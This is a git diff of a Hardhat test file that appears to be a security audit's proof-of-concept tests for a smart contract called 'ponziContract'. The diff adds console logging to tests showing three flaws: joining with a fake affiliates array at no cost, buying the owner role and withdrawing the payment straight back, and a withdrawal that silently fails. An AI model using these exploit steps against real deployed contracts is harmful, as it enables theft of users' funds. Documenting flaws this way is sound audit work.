@@ -32,8 +32,9 @@ describe.only(NAME, function () {
     */
   it("CriticalIssue1", async function () {
     const balanceBefore = await ethers.provider.getBalance(user.address);
+    console.log("User Eth balance before joinPonzi: " + balanceBefore)
 
-    // Lets join ponzi with fake afilliates array
+    console.log("User joins ponzi with fake afilliates array...")
     await ponziContract
       .connect(user)
       .joinPonzi([user.address, user.address, user.address], {
@@ -41,12 +42,13 @@ describe.only(NAME, function () {
       });
 
     const balanceAfter = await ethers.provider.getBalance(user.address);
+    console.log("User Eth balance after joinPonzi: " + balanceAfter)
 
-    // Balance for user not changed after joining Ponzi
     expect(balanceBefore - balanceAfter).to.be.closeTo(
       0,
       ethers.parseEther("0.001")
     );
+    console.log("User Eth balance not changed!")
   });
 
   /**
@@ -56,7 +58,9 @@ describe.only(NAME, function () {
     await ponziContract.addNewAffilliate(user);
 
     const balanceBefore = await ethers.provider.getBalance(user.address);
+    console.log("User Eth balance before claim ownership: " + balanceBefore)
 
+    console.log("User claims ownership...")
     await ponziContract
       .connect(user)
       .buyOwnerRole(user.address, { value: ethers.parseEther("10") });
@@ -65,11 +69,14 @@ describe.only(NAME, function () {
       .ownerWithdraw(user.address, ethers.parseEther("10"));
 
     const balanceAfter = await ethers.provider.getBalance(user.address);
+    console.log("User Eth balance after claim ownership: " + balanceAfter)
+
     // Balance not changed
     expect(balanceBefore - balanceAfter).to.be.closeTo(
       0,
       ethers.parseEther("0.001")
     );
+    console.log("User Eth balance not changed!")
   });
 
   /**
@@ -88,12 +95,12 @@ describe.only(NAME, function () {
       .connect(user)
       .buyOwnerRole(user.address, { value: ethers.parseEther("10") });
 
-    // Try to withdraw money to some dummyContract without receive() functionality
+    console.log("Owner tries to withdraw money to some dummyContract without receive() functionality...")
     await ponziContract
       .connect(user)
       .ownerWithdraw(dummyContract, ethers.parseEther("5"));
 
-    // dummyContract still have 0 balance, despite the transaction executed successfully
     expect(await ethers.provider.getBalance(dummyContract)).to.equal(0);
+    console.log("dummyContract still have 0 balance, despite the transaction executed successfully!")
   });
 });
